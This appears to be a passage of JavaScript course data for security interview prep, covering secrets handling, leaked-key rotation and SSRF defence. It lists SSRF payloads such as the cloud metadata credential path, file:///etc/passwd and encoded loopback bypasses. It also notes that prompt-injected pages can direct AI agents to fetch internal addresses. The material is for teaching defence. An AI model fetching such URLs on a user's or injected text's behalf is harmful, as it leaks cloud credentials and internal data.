  <p>🔵 <b>Secrets management.</b> A <b>secret</b> is anything that grants power: DB passwords, API keys, signing keys, tokens. Rules: (1) <b>never in source code, never in git</b> (history keeps it forever), never in Docker image layers or client-side apps. (2) Load at runtime from the <b>environment</b> or, better, a <b>vault</b> (HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault) that gives each service an identity-based, audited, short-lived credential. (3) <b>Rotate</b> regularly and immediately after exposure. (4) <b>Least privilege</b>: one key per service with minimal scope. (5) <b>Scan</b> commits (gitleaks, GitHub secret scanning, pre-commit hooks).</p>
  <p>🔴 <b>Leaked key playbook (memorize).</b> 1) <b>Revoke/disable</b> the key now (or create the replacement first if revoking would cause an outage). 2) <b>Issue a new key</b> and deploy it from the vault. 3) <b>Check logs</b> for use of the old key from unknown IPs (cloud audit trail) and assess damage. 4) <b>Clean the repo</b> (rewriting history is cosmetic: assume the key is public forever, so rotation is the real fix). 5) <b>Add prevention</b>: pre-commit scan, short-lived credentials. 6) <b>Blameless post-mortem</b>.</p>
  <p>🟣 <b>Best secret is no secret:</b> use workload identity (IAM roles, Kubernetes service accounts, OIDC federation from CI) so there is no long-lived key to leak.</p>`,
  clues: [
    '"where do you store API keys / DB passwords?" - vault or env injected at runtime, never in git',
    '"a key was committed to GitHub" - revoke and rotate first; deleting the commit is not enough',
    '"how do you store passwords?" - Argon2id/bcrypt with unique salt, tuned cost; never encrypt, never fast hash',
    '"credential stuffing / brute force on login" - rate limit per account+IP, MFA, breached-password check, lockout with care',
    '"JWT never expires" or "alg none" - short-lived access tokens, verify signature and algorithm, rotate refresh tokens',
    '"zero downtime key rotation" - dual-key window: accept old and new, switch signer, retire old'
  ],
  code: [
    { lang: 'python', run: true, title: 'Runnable: salted slow password hash + constant-time verify', code: `import hashlib, hmac, os

def hash_password(password: str, salt: bytes = None, n=2**14, r=8, p=1):
    salt = salt or os.urandom(16)                      # unique random salt per user
    digest = hashlib.scrypt(password.encode(), salt=salt, n=n, r=r, p=p, dklen=32)
    return salt.hex() + '$' + digest.hex()             # store both; params are known to the app

def verify_password(password: str, stored: str) -> bool:
    salt_hex, digest_hex = stored.split('$')
    candidate = hash_password(password, bytes.fromhex(salt_hex)).split('$')[1]
    return hmac.compare_digest(candidate, digest_hex)  # constant time: no timing leak

stored = hash_password('correct horse battery staple')
print('stored form  :', stored[:20] + '...')
print('right password:', verify_password('correct horse battery staple', stored))
print('wrong password:', verify_password('password123', stored))
print('same password twice differs (salt):', hash_password('abc') != hash_password('abc'))` },
    { lang: 'java', title: 'Load secrets from the environment, fail fast, never log them', code: `public class Config {
    /** Reads a required secret; the value comes from the environment (or a vault agent that injects it). */
    static String required(String name) {
        String v = System.getenv(name);
        if (v == null || v.isBlank()) {
            // Fail at startup, and name the variable - but never print the value.
            throw new IllegalStateException("Missing required secret: " + name);
        }
        return v;
    }
    /** Masks a secret for logs: keep only the last 2 characters. */
    static String mask(String s) {
        return s.length() <= 4 ? "****" : "****" + s.substring(s.length() - 2);
    }
    public static void main(String[] args) {
        String fake = "example-not-a-real-key-1234";   // demonstration value only
        System.out.println("db password = " + mask(fake));
        try { required("DB_PASSWORD_DOES_NOT_EXIST_DEMO"); }
        catch (IllegalStateException e) { System.out.println("startup failed: " + e.getMessage()); }
    }
}` },
    { lang: 'bash', check: false, title: 'Pre-commit / CI secret scanning (placeholders only)', code: `# .pre-commit-config.yaml uses gitleaks; CI also scans the whole history\ngitleaks detect --source . --redact --verbose      # --redact hides the secret in the report\n\n# Runtime injection from a vault instead of a .env committed to git\nexport DB_PASSWORD="$(vault kv get -field=password secret/shop/db)"   # needs a short-lived vault token\n./start-app.sh` }
  ],
  codeTitle: ['Python: Argon-style password storage (scrypt)', 'Java: secrets from env, masked', 'Bash: scanning and vault injection'],
  viz: {
    title: 'Leaked key playbook: rotate without downtime',
    input: '2',
    inputLabel: 'Step to stop at (1-6) - or press Play',
    gen: function (input) {
      var steps = [
        ['1. Detect', 'Secret scanner alerts: a cloud key was pushed to a public repo', 'key OLD active'],
        ['2. Create new', 'Vault issues key NEW (least-privilege). Both keys valid for a short overlap', 'OLD + NEW active'],
        ['3. Deploy new', 'Services read NEW from the vault and restart/roll one by one', 'traffic moves to NEW'],
        ['4. Revoke old', 'OLD key disabled. Attackers holding it now get 401/403', 'only NEW active'],
        ['5. Investigate', 'Search audit logs for OLD key use from unknown IPs; scope the damage', 'evidence collected'],
        ['6. Prevent', 'Add pre-commit scanning, move to short-lived workload identity, write post-mortem', 'done']
      ];
      var frames = [], rows = [], hl = {}, i;
      for (i = 0; i < steps.length; i++) {
        rows.push([steps[i][0], steps[i][1], steps[i][2]]);
        hl = {}; hl[i] = i === 3 ? 'bad' : (i === steps.length - 1 ? 'sel' : 'cur');
        if (i > 0) hl[i - 1] = 'done';
        var vals = { oldKey: i < 3 ? 'ACTIVE (exposed)' : 'REVOKED', newKey: i < 1 ? 'not issued' : 'ACTIVE', downtime: '0 seconds' };
        var vh = { oldKey: i < 3 ? 'bad' : 'done', newKey: i < 1 ? 'done' : 'ok' };
        frames.push({ narr: '<b>' + steps[i][0] + ':</b> ' + steps[i][1] + '.' + (i === 3 ? ' <span class="c-r">Only revoke after services run on the new key, otherwise you cause your own outage.</span>' : ''), parts: [tbl(['Step', 'What happens', 'State'], rows.slice(), hl), { type: 'vars', label: 'Key states', vals: vals, hl: vh }] });
      }
      return frames;
    }
  },
  examples: [
    { title: 'Rotate a leaked key (worked checklist)', html: `<p>An AWS access key was pasted in a public repo 20 minutes ago. <b>Do:</b> (1) in IAM create a second key for the same user/role, (2) deploy the new key through the secrets manager, (3) deactivate the old key, then delete it, (4) query CloudTrail for the old key id in the exposure window, (5) enable GitHub push protection and a pre-commit scan. <b>Also:</b> move the app to an IAM role so there is no key at all next time.</p>` },
    { title: 'Zero-downtime rotation of a JWT signing key', html: `<p>Publish keys in a JWKS list with ids (<code>kid</code>). Step 1: add new key <code>k2</code> to the verify list. Step 2: switch the signer to <code>k2</code>. Step 3: wait for the longest token lifetime (say 15 minutes). Step 4: remove <code>k1</code>. Tokens signed by either key verify during the overlap.</p>` },
    { title: 'Password reset that does not leak accounts', html: `<p>Bad: "No account with that email" vs "Email sent" tells attackers which emails are registered. Good: always answer "If that account exists, we sent an email", use a single-use random token with 15-minute expiry stored as a hash, rate limit by IP and account, and invalidate all sessions after the reset.</p>` }
  ],
  deepDive: `<p>🟣 <b>Password hashing economics.</b> A GPU can try billions of SHA-256 guesses per second; Argon2id is <i>memory-hard</i>, so cost scales with RAM and defeats cheap parallel hardware. OWASP minimum for Argon2id is about 19 MiB memory, 2 iterations, 1 parallelism; tune so one hash takes roughly 100-500 ms on your servers. Store the algorithm and parameters with the hash so you can upgrade at next login. A <b>pepper</b> (server-side secret, kept in an HSM/KMS) adds protection if only the database leaks.</p>
  <p><b>Encryption done right.</b> Use authenticated encryption (AES-GCM or ChaCha20-Poly1305) with a unique nonce per message - reusing a nonce under GCM is catastrophic. Use <b>envelope encryption</b>: a master key in KMS encrypts per-record data keys, so rotating the master key only re-wraps small keys. Never invent your own protocol; use libraries like libsodium or Tink. Differentiate <i>encoding</i> (Base64 - reversible by anyone) from <i>hashing</i> (one-way) from <i>encryption</i> (reversible with a key).</p>
  <p><b>Vault internals.</b> Dynamic secrets: Vault creates a database user with a 1-hour TTL per app instance and deletes it afterwards, so there is nothing to steal later. Access is by identity (Kubernetes service account, cloud IAM, AppRole), policies are path-based, every read is audited, and sealing/unsealing protects the master key (Shamir shards or cloud auto-unseal). <b>Pitfalls:</b> secrets in environment variables can leak via crash dumps, <code>/proc</code>, and debug endpoints; secrets baked into images; <code>.env</code> committed; CI logs echoing variables; same key shared by dev and prod. <b>Auth hardening:</b> MFA/passkeys (WebAuthn) resist phishing, check passwords against breached lists (k-anonymity API), generic error messages, and rate limit per account (covered in the rate limiting topic).</p>`,
  aiEra: `<p>🤖 <b>What AI changes:</b> Bots scan every public commit within seconds; leaked keys are abused in minutes, and AI coding agents increasingly <i>read</i> your <code>.env</code>, shell history and logs. An agent given your cloud key can do anything that key can. Assistants also paste example keys into code, or "fix" a failing login by disabling a check. <b>Work alongside it:</b> keep secrets out of any file the agent can read (use a secrets manager and short-lived tokens), add the scanner to the agent's pre-commit, and give agents scoped, revocable credentials. Ask AI to "list every place this repo reads a secret and how it is injected". <b>Where AI goes wrong:</b> suggests MD5/SHA-256 for passwords, <code>Math.random()</code> for tokens, or <code>verify=False</code> for TLS because it silences an error. <b>You still own:</b> the rotation runbook, key hierarchy, and the decision of what an agent may touch.</p>`,
  problems: [
    P('Respond to a Leaked Cloud Key', 'Medium', ['secrets', 'rotation', 'incident'],
      `<p>At 10:02 a secret scanner reports that a production cloud access key was committed to a public repository at 09:41. The key can read and write the customer-files bucket. Write the response plan in order, and explain how to avoid downtime.</p>`,
      `Production traffic is live; 30 services read the key; you have a secrets manager and cloud audit logs.`,
      `<p>Order: ${H.c('b', 'contain')} then ${H.c('g', 'replace')} then ${H.c('y', 'investigate')} then ${H.c('p', 'prevent')}.</p>`,
      `<p>Delete the commit and force-push, then carry on. The key was public for 20 minutes and is already copied by bots; deleting history fixes nothing.</p>`,
      { q: 'What is the real fix for a leaked key?', options: ['Rewrite git history', 'Rotate (revoke and replace) the key', 'Make the repository private', 'Ask users to change passwords'], answer: 1, explain: 'Once public, assume copied. Only revoking makes it useless; history cleaning is cosmetic.' },
      [`<p>Hint 1: assume the attacker already has the key; time matters more than cleanliness.</p>`, `<p>Hint 2: create the new key and roll it out before disabling the old one, unless active abuse justifies immediate revoke.</p>`, `<p>Hint 3: use audit logs for the 09:41-now window; check data read, objects written, new IAM users; then prevention.</p>`],
      `<p>1) Triage in minutes: confirm the key is live and which permissions it has. If you can see active abuse (unknown IPs, mass downloads), disable now and accept a short outage; otherwise 2) issue a new least-privilege key and put it in the secrets manager, 3) roll services to read it (rolling restart or hot reload) and verify health, 4) disable then delete the old key. 5) Investigate with the cloud audit trail filtered by the old key id from 09:41: list actions, source IPs, objects accessed; check for persistence (new users, new keys, changed bucket policies) and revert them; decide on customer notification with legal if data was accessed. 6) Remove it from the repo and rewrite history for hygiene, but treat that as secondary. 7) Prevent: push protection and pre-commit gitleaks, move the workload to an IAM role so no static key exists, split permissions per service, add an alert for key use from new IPs, and hold a blameless post-mortem.</p>`,
      `<p>Not algorithmic. Target: contain within 15 minutes, full rotation within hours.</p>`, ['How do you do this when 30 teams own services that use the key?', 'How would workload identity remove the problem?'])
  ]
});

/* =========================================================
   TOPIC 4 — SSRF, insecure design, security misconfiguration
   ========================================================= */
topics.push({
  title: 'SSRF, Insecure Design & Security Misconfiguration (A10, A04, A05)',
  analogy: `<p>You are a receptionist inside a locked office. A stranger at the door says, "Please call this number and read me what they say." You have access to the <b>internal phone list</b>, so if the stranger asks you to call "the CEO's private line" or "the safe's keypad", you do it - because the call comes from <b>you</b>, a trusted insider. <b>SSRF (Server-Side Request Forgery)</b> is that: the attacker makes <i>your server</i> fetch a URL, and your server can reach places the attacker cannot (internal services, the cloud metadata address <code>169.254.169.254</code>).</p>`,
  explain: `<p>🟢 <b>SSRF in plain words.</b> Features such as "import from URL", webhooks, link previews, PDF/image fetchers and avatar-by-URL make your backend send HTTP requests to a URL <b>the user chose</b>. If the user chooses <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>, a cloud server may return its own temporary cloud credentials. That single bug caused major real-world breaches. SSRF was added as <b>A10 in OWASP 2021</b>; the 2025 edition folds it into A01 Broken Access Control.</p>
  ${H.table(['URL the attacker supplies', 'Why it is dangerous', 'Guard decision'], [
    ['<code>https://example.com/logo.png</code>', 'normal public site', H.c('g', 'allow')],
    ['<code>http://169.254.169.254/latest/meta-data/</code>', 'cloud metadata: temporary credentials', H.c('r', 'block (link-local)')],
    ['<code>http://localhost:6379/</code>', 'internal Redis / admin ports', H.c('r', 'block (loopback)')],
    ['<code>http://10.0.0.5/admin</code>', 'private network service', H.c('r', 'block (private)')],
    ['<code>http://2130706433/</code>', '127.0.0.1 written as a number', H.c('r', 'block after normalizing')],
    ['<code>http://evil.test</code> that resolves to 10.0.0.5', 'DNS points to internal IP', H.c('r', 'block: check resolved IP')],
    ['<code>file:///etc/passwd</code>, <code>gopher://</code>', 'non-HTTP schemes', H.c('r', 'block (scheme allow-list)')]
  ])}
  <p>🔵 <b>The defence stack.</b> (1) <b>Prefer an allow-list of destinations</b> ("we only call api.partner.com"). (2) If users really can enter any URL: allow only <code>http</code>/<code>https</code>, parse the URL with a real parser, <b>resolve DNS yourself</b>, reject loopback, private (10/8, 172.16/12, 192.168/16), link-local (169.254/16), unique-local IPv6 (fc00::/7), multicast, and "0.0.0.0". (3) <b>Connect to the IP you checked</b> (pin it) to avoid DNS rebinding where the second lookup returns a different IP. (4) <b>Do not follow redirects</b> blindly: re-check each hop. (5) Limit response size and time. (6) Use <b>IMDSv2</b> (token required, hop limit 1) on cloud VMs, run the fetcher in an isolated network with <b>egress firewall</b> rules.</p>
  <p>🔴 <b>Insecure design (A04)</b> is a flaw you cannot fix with a patch because the <i>plan</i> is wrong: no limit on coupon tries, a "forgot password" flow with a guessable question, no abuse case written for the feature. The cure is <b>threat modeling</b> (STRIDE) before coding: draw the data flow, mark trust boundaries, ask "what can go wrong here?" for each arrow. <b>Security misconfiguration (A05)</b> is a correct design running with bad settings: default admin passwords, debug mode on, open S3 buckets, directory listing, verbose stack traces, unneeded ports, permissive CORS (<code>*</code> with credentials), missing security headers.</p>
  <p>🟣 <b>Threat model a file upload.</b> See the guided problem. Typical threats: executable upload, path traversal in filename, zip bomb, huge files (DoS), polyglot images, malware, SSRF via "import from URL", and serving user files from your main domain (stored XSS).</p>`,
  clues: [
    '"fetch a URL provided by the user" / "webhook" / "link preview" / "import from URL" - SSRF',
    '"169.254.169.254" or "cloud metadata" - SSRF target; mention IMDSv2 and egress rules',
    '"blocklist localhost" - weak: decimal/hex/IPv6/DNS-rebinding tricks; resolve and check the IP',
    '"design a secure file upload / password reset / coupon system" - threat model first (STRIDE, abuse cases)',
    '"default credentials, debug on, open bucket, verbose errors" - security misconfiguration',
    '"redirects" - re-validate each hop or disable following'
  ],
  code: [
    { lang: 'js', run: true, title: 'Runnable: SSRF URL guard (rejects private / link-local / loopback)', code: `// Guard that decides if a URL is safe for the SERVER to fetch.
// "resolve" is injected so this demo works offline; production code would use dns.promises.lookup(host, {all:true}).
function ipv4ToInt(ip) { return ip.split('.').reduce((a, b) => (a * 256) + Number(b), 0); }
function inRange(ip, cidr) {
  const [base, bits] = cidr.split('/');
  const size = Math.pow(2, 32 - Number(bits));
  const n = ipv4ToInt(ip), b = ipv4ToInt(base);
  return n >= b && n < b + size;
}
const BLOCKED_V4 = ['0.0.0.0/8', '10.0.0.0/8', '100.64.0.0/10', '127.0.0.0/8', '169.254.0.0/16', '172.16.0.0/12', '192.168.0.0/16', '224.0.0.0/4', '240.0.0.0/4'];
function isBlockedIp(ip) {
  if (/^\\d+\\.\\d+\\.\\d+\\.\\d+$/.test(ip)) return BLOCKED_V4.some((c) => inRange(ip, c));
  const v6 = ip.toLowerCase().replace(/^\\[|\\]$/g, '');
  if (v6 === '::1' || v6 === '::') return true;                       // loopback / unspecified
  if (/^f[cd]/.test(v6) || /^fe[89ab]/.test(v6)) return true;         // unique-local fc00::/7, link-local fe80::/10
  if (v6.startsWith('::ffff:')) return true;                          // IPv4-mapped: treat as blocked (or unwrap and re-check)
  return false;
}
function checkUrl(raw, resolve) {
  let u;
  try { u = new URL(raw); } catch (e) { return { ok: false, why: 'not a valid URL' }; }
  if (!['http:', 'https:'].includes(u.protocol)) return { ok: false, why: 'scheme not allowed: ' + u.protocol };
  if (u.username || u.password) return { ok: false, why: 'credentials in URL not allowed' };
  const host = u.hostname;                                            // URL class already normalizes 2130706433 -> 127.0.0.1
  const ips = /^[\\d.]+$/.test(host) || host.startsWith('[') ? [host] : resolve(host);
  if (!ips.length) return { ok: false, why: 'does not resolve' };
  for (const ip of ips) if (isBlockedIp(ip)) return { ok: false, why: 'blocked address ' + ip };
  return { ok: true, why: 'public address ' + ips.join(',') };
}
const fakeDns = { 'example.com': ['93.184.216.34'], 'evil.test': ['10.0.0.5'], 'metadata.test': ['169.254.169.254'] };
const resolve = (h) => fakeDns[h] || [];
for (const url of ['https://example.com/logo.png', 'http://169.254.169.254/latest/meta-data/', 'http://localhost/', 'http://2130706433/', 'http://0x7f.1/', 'http://evil.test/x', 'http://[::1]:8080/', 'http://[fd00::1]/', 'file:///etc/passwd', 'ftp://example.com/', 'http://user:pw@example.com/']) {
  const r = checkUrl(url, resolve);
  console.log((r.ok ? 'ALLOW ' : 'BLOCK ') + url + '  -> ' + r.why);
}` },
    { lang: 'java', title: 'Java: classify an address (compiles; use after DNS resolution)', code: `import java.net.*;

public class SsrfGuard {
    /** True if the address is one a user-triggered request must never reach. */
    static boolean isForbidden(InetAddress a) {
        return a.isAnyLocalAddress()        // 0.0.0.0, ::
            || a.isLoopbackAddress()        // 127.0.0.0/8, ::1
            || a.isLinkLocalAddress()       // 169.254.0.0/16 (cloud metadata!), fe80::/10
            || a.isSiteLocalAddress()       // 10/8, 172.16/12, 192.168/16
            || a.isMulticastAddress();
    }
    public static void main(String[] args) throws Exception {
        for (String ip : new String[] {"93.184.216.34", "169.254.169.254", "127.0.0.1", "10.1.2.3", "192.168.1.9"}) {
            // getByName with a literal IP does no DNS lookup, so this demo is offline-safe.
            System.out.println(ip + " forbidden? " + isForbidden(InetAddress.getByName(ip)));
        }
    }
}` },
    { lang: 'bash', check: false, title: 'Cloud hardening: IMDSv2 required, hop limit 1 (AWS CLI example)', code: `aws ec2 modify-instance-metadata-options \\\n  --instance-id i-0123456789abcdef0 \\\n  --http-tokens required \\\n  --http-put-response-hop-limit 1 \\\n  --http-endpoint enabled` }
  ],
  codeTitle: ['JS: SSRF URL guard', 'Java: address classifier', 'Cloud: IMDSv2'],
  viz: {
    title: 'SSRF: request path with and without the URL guard',
    input: 'http://169.254.169.254/latest/meta-data/',
    inputLabel: 'URL the attacker asks the server to fetch',
    gen: function (input) {
      var raw = String(input).trim();
      var mm = raw.match(/^([a-z][a-z0-9+.-]*:)\/\/(\[[^\]]+\]|[^\/:?#]+)/i);
      if (!mm) throw new Error('Enter a full URL such as http://10.0.0.5/admin');
      var u = { protocol: mm[1].toLowerCase() }, host = mm[2].toLowerCase();
      var m = host.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
      var internal = false, reason = 'public address';
      if (u.protocol !== 'http:' && u.protocol !== 'https:') { internal = true; reason = 'scheme ' + u.protocol + ' not allowed'; }
      else if (host === 'localhost' || host === '[::1]') { internal = true; reason = 'loopback'; }
      else if (m) {
        var a = +m[1], b = +m[2];
        if (a === 169 && b === 254) { internal = true; reason = 'link-local / cloud metadata'; }
        else if (a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)) { internal = true; reason = 'private / loopback range'; }
      }
      function nodes() { return [{ id: 'A', label: 'Attacker', x: 8, y: 25, shape: 'box' }, { id: 'APP', label: 'App server', x: 40, y: 25, shape: 'box' }, { id: 'G', label: 'URL guard', x: 40, y: 8, shape: 'box' }, { id: 'INT', label: 'Internal / metadata', x: 82, y: 40, shape: 'box', w: 22 }, { id: 'WEB', label: 'Public internet', x: 82, y: 10, shape: 'box', w: 22 }]; }
      function edges() { return [['A', 'APP', 'url=...'], ['APP', 'G', 'check'], ['APP', 'INT', 'fetch'], ['APP', 'WEB', 'fetch']]; }
      var frames = [];
      frames.push({ narr: 'The attacker submits <code>' + H.esc(raw) + '</code> to a feature like "import image from URL".', parts: [{ type: 'graph', directed: true, height: 50, nodes: nodes(), edges: edges(), hl: { A: 'cur' }, ehl: { 'A-APP': 'cur' } }] });
      frames.push({ narr: '<b>Without a guard</b> the app fetches whatever it is told. Target type: <b>' + reason + '</b>.', parts: [{ type: 'graph', directed: true, height: 50, nodes: nodes(), edges: edges(), hl: { APP: 'cur', INT: internal ? 'bad' : 'ok', WEB: internal ? '' : 'ok' }, ehl: internal ? { 'APP-INT': 'bad' } : { 'APP-WEB': 'ok' } }] });
      frames.push({ narr: internal ? '<span class="c-r">The server reached an internal system for the attacker and returns the response (for the metadata address: temporary cloud credentials).</span>' : 'This URL is a normal public site, so fetching it is fine.', parts: [{ type: 'vars', label: 'Unguarded result', vals: { target: host, kind: reason, leaked: internal ? 'YES' : 'no' }, hl: { leaked: internal ? 'bad' : 'ok' } }] });
      frames.push({ narr: '<b>With the guard:</b> parse the URL, resolve DNS, and test the resolved IP against blocked ranges before connecting.', parts: [{ type: 'graph', directed: true, height: 50, nodes: nodes(), edges: edges(), hl: { G: 'cur', APP: 'cur' }, ehl: { 'APP-G': 'cur' } }, { type: 'vars', label: 'Guard input', vals: { scheme: u.protocol, host: host } }] });
      frames.push({ narr: internal ? '<span class="c-g">Guard says BLOCK (' + reason + '). The app returns a generic 400 and logs the attempt.</span>' : '<span class="c-g">Guard says ALLOW. Connect to the checked IP only, no unchecked redirects, short timeout, size cap.</span>', parts: [{ type: 'graph', directed: true, height: 50, nodes: nodes(), edges: edges(), hl: { G: internal ? 'bad' : 'ok', INT: '', WEB: internal ? '' : 'ok' }, ehl: internal ? { 'APP-G': 'bad' } : { 'APP-WEB': 'ok' } }] });
      frames.push({ narr: 'Belt and braces: even if the guard has a bug, an <b>egress firewall</b> and <b>IMDSv2</b> mean the app host cannot reach internal ranges or hand out credentials to a simple GET.', parts: [{ type: 'text', html: '<b>Layers:</b> destination allow-list, resolve and check IP, pin IP, no blind redirects, IMDSv2, egress rules, isolated fetch service.' }] });
      return frames;
    }
  },
  examples: [
    { title: 'Block SSRF to 169.254.169.254', html: `<p>Feature: "paste an image URL and we will download it". Attack: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name</code>. Fix: resolve host, reject link-local, loopback and private ranges; also set IMDSv2 required so a plain GET returns nothing; run the downloader as a separate service with an egress firewall that only allows public addresses on 80/443.</p>` },
    { title: 'DNS rebinding bypass and the fix', html: `<p>Attacker's domain returns a public IP on the first lookup (guard passes) and <code>127.0.0.1</code> on the second (HTTP client connects). <b>Fix:</b> resolve once, validate, and connect to that exact IP (send the Host header yourself), or use an HTTP client hook that validates the address at connect time.</p>` },
    { title: 'Security misconfiguration checklist', html: `<ul><li>Debug/actuator endpoints off or authenticated (<code>/actuator/env</code> leaks config).</li><li>No default passwords; admin consoles not on the public internet.</li><li>Cloud storage private by default; block public access at the account level.</li><li>Security headers: HSTS, <code>X-Content-Type-Options: nosniff</code>, CSP, <code>frame-ancestors</code>.</li><li>Generic error pages; stack traces only in logs.</li><li>Infrastructure as code scanned (Checkov, tfsec) in CI.</li></ul>` }
  ],
  deepDive: `<p>🟣 <b>Why blocklists of strings fail.</b> The same address has many spellings: <code>127.1</code>, <code>0x7f000001</code>, <code>2130706433</code>, <code>017700000001</code>, <code>[::ffff:127.0.0.1]</code>, <code>localtest.me</code> (a public DNS name that returns 127.0.0.1). Parsing differences between your validator and your HTTP client are the root cause of most bypasses - validate with the <i>same</i> parser that makes the request, and check the final IP after DNS. Redirects (302 to an internal address), URL userinfo tricks (<code>http://good.com@evil.com</code>), and unusual schemes (<code>gopher://</code> to talk to Redis, <code>file://</code>) are the other classic tricks. <b>Blind SSRF</b> (no response shown) still allows port scanning via timing and hitting internal write APIs.</p>
  <p><b>Threat modeling methods.</b> STRIDE = Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege. Steps: (1) data flow diagram, (2) trust boundaries (internet / DMZ / internal / third party), (3) for each flow apply STRIDE, (4) rate by likelihood x impact (DREAD or CVSS), (5) choose mitigations, (6) write tests/abuse cases, (7) revisit when design changes. <b>Insecure design examples:</b> unlimited password attempts, business logic bypass (negative quantity refunds money), predictable resource ids with no auth, trust of client-side prices. <b>Secure by default:</b> least privilege, fail closed, separate duties, minimise attack surface, defence in depth - principles worth quoting in interviews.</p>
  <p><b>Misconfiguration at scale:</b> use hardened base images (distroless), CIS benchmarks, policy-as-code (OPA/Kyverno) to block privileged containers, and drift detection. Misconfigurations are the top cause of cloud breaches, so automate checks rather than relying on humans reading a runbook.</p>`,
  aiEra: `<p>🤖 <b>What AI changes:</b> SSRF has a big new home: <b>AI agents and RAG systems that browse or fetch URLs</b>. A prompt-injected page can tell an agent "fetch http://169.254.169.254/..." or send data to an attacker URL. Every "tool" that fetches must use the same guard, network egress rules and size/time limits as any user-URL feature. LLM-driven scrapers are also common abusers of link-preview endpoints. <b>Use AI as a partner:</b> have it draft a STRIDE table for your data flow diagram, then challenge each row; ask it for a list of URL-parser differential tricks to add to your test suite. <b>Where AI goes wrong:</b> generates a "validate_url" that only checks the string for "localhost" or "127.0.0.1", and calls it done. <b>You still own:</b> deciding which destinations are legitimate, the network-level controls, and the threat model itself.</p>`,
  problems: [
    P('Threat-Model a File Upload Feature', 'Hard', ['threat modeling', 'file upload', 'design'],
      `<p>Your product lets users upload a profile photo and a PDF resume. Files are stored and later shown to other users and processed by a thumbnailer. Produce a threat model: assets, entry points, threats (STRIDE), and a concrete list of mitigations.</p>`,
      `Max 5 MB; users are anonymous-to-semi-trusted; storage is object storage plus a CDN; processing uses an image library.`,
      `<p>Example threat row: ${H.c('r', 'Tampering - upload shell.php renamed to photo.jpg')} to ${H.c('g', 'detect real type by magic bytes, re-encode image, store with random name, serve as non-executable from a separate domain')}.</p>`,
      `<p>Check the file extension in JavaScript in the browser and save with the original name in the web root. Anyone can bypass client checks and execute uploaded scripts or overwrite files.</p>`,
      { q: 'Which is the strongest protection against a malicious image?', options: ['Check the extension is .jpg', 'Trust the Content-Type header', 'Decode and re-encode the image, store under a random name on a separate domain', 'Limit upload to logged-in users'], answer: 2, explain: 'Re-encoding strips hidden payloads; random names stop path tricks; a separate cookieless domain contains XSS.' },
      [`<p>Hint 1: list what you protect (other users, servers, storage bill) and every place a file or filename crosses a trust boundary.</p>`, `<p>Hint 2: go through STRIDE: spoofed owner, tampered name/path, info leak via public URL, DoS by size or zip bomb, elevation by executing the file.</p>`, `<p>Hint 3: mitigations: size and count limits, magic-byte type check, re-encode, random key, private bucket + signed URLs, malware scan, separate domain, sandboxed processing with timeouts.</p>`],
      `<p>Assets: other users' browsers, our servers, storage, user privacy. Entry points: the upload request (file body, filename, Content-Type), the thumbnail worker, and the download URL. Threats and mitigations: Spoofing - only the authenticated user may upload to their own profile; check ownership on replace/delete. Tampering - filename like ../../x or x.php: ignore the user's name, generate a random key, store outside any executable path, never trust Content-Type; detect type by magic bytes and allow-list (jpeg/png/webp/pdf). Information disclosure - private bucket, short-lived signed URLs, strip EXIF GPS data. Denial of service - cap size at the edge (5 MB), rate limit uploads per user, limit image dimensions and decompressed size (pixel bombs), timeout and memory-limit the thumbnailer, reject archives. Elevation of privilege - run the image library in a sandboxed low-privilege container with no network (image parsers have many CVEs), scan with antivirus, re-encode images so payloads vanish, serve user content from a separate cookieless domain with <code>Content-Disposition</code> for PDFs, <code>nosniff</code> and a strict CSP. Repudiation - audit-log who uploaded what, hash, IP, time. Also test: polyglot files, huge dimensions, zero-byte files, double extensions.</p>`,
      `<p>Not algorithmic; the output is a ranked mitigation list. Re-encoding costs CPU, so process asynchronously from a queue.</p>`, ['How does your design change for direct-to-storage uploads with presigned URLs?', 'How would you scan large files without blocking the user?']),
    P('Review a Link-Preview Service for SSRF', 'Hard', ['ssrf', 'design review'],
      `<p>A chat product fetches a pasted URL on the server to show a title and image. Review it for SSRF and write the hardening plan including network controls, redirect handling and monitoring.</p>`,
      `Runs on a cloud VM with an instance role; 5M previews per day.`,
      `<p>${H.c('r', 'http://169.254.169.254/')} must fail; ${H.c('g', 'https://news.example/article')} must pass; a public URL that redirects to an internal address must fail on the redirect hop.</p>`,
      `<p>Compare the URL string with a list of bad words like "localhost" and "169.254". It misses decimal, hex, IPv6 and DNS names that resolve to internal addresses.</p>`,
      { q: 'Why resolve DNS yourself and connect to the checked IP?', options: ['It is faster', 'It stops DNS rebinding between check and use', 'It encrypts the request', 'It avoids redirects'], answer: 1, explain: 'If the HTTP client resolves again, the attacker can return a different (internal) IP the second time.' },
      [`<p>Hint 1: the server is the confused deputy; what can the server reach that the user cannot?</p>`, `<p>Hint 2: validate the resolved IP, handle redirects per hop, and add network-level egress limits.</p>`, `<p>Hint 3: split the fetcher into its own low-privilege service and monitor for blocked attempts.</p>`],
      `<p>Findings: the feature turns the server into a proxy into the VPC. Plan: (1) scheme allow-list http/https and ports 80/443 only; (2) parse with the standard URL parser, reject userinfo; (3) resolve all A/AAAA records, reject if any is loopback, private, link-local, multicast or unspecified; unwrap IPv4-mapped IPv6; (4) connect to the validated IP (pinned) with the original Host header and SNI; (5) follow at most 3 redirects, re-running steps 1-4 on each hop; (6) timeouts (3 s connect, 5 s total), max body 1 MB, only parse text/html and images, do not return raw bodies to the user; (7) move the fetcher into its own service/VPC with no instance role, no access to internal subnets, and an egress firewall or proxy that blocks private ranges; (8) require IMDSv2 and hop limit 1 on all VMs; (9) rate limit per user and cache results by canonical URL; (10) log every blocked attempt with user id and alert on bursts (scanning behaviour); (11) tests with the bypass corpus: decimal/hex/octal IPs, IPv6, rebinding domains, redirects, userinfo tricks.</p>`,
      `<p>One extra DNS resolution per fetch; negligible relative to the HTTP call.</p>`, ['What if customers need to preview URLs inside their own private network?', 'How would you test the guard automatically?'])
  ]
});

/* =========================================================
   TOPIC 5 — TLS / mTLS
   ========================================================= */
topics.push({
  title: 'TLS & mTLS: The Handshake, Certificates and Service-to-Service Trust',
